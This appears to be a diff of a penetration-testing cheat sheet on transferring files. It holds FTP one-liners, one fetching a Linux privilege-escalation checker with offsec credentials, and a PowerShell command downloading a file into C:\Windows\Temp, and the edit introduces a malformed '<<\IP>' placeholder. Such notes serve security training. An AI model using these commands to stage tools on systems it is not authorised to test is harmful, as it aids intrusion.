@@ -17,7 +17,7 @@ echo "bye">>ftp.txt
 ftp -s ftp.txt  
 
 Linux
-ftp -4 -d -v ftp://offsec:offsec@<IP>//linuxprichecker.py < ftp upload one liner linux
+ftp -4 -d -v ftp://offsec:offsec@<<\IP>//linuxprichecker.py < ftp upload one liner linux
 
 ### Powershell
 powershell.exe  (New-Object System.Net.WebClient).DownloadFile("https://example.com/archive.zip", "C:\Windows\Temp\archive.zip") 
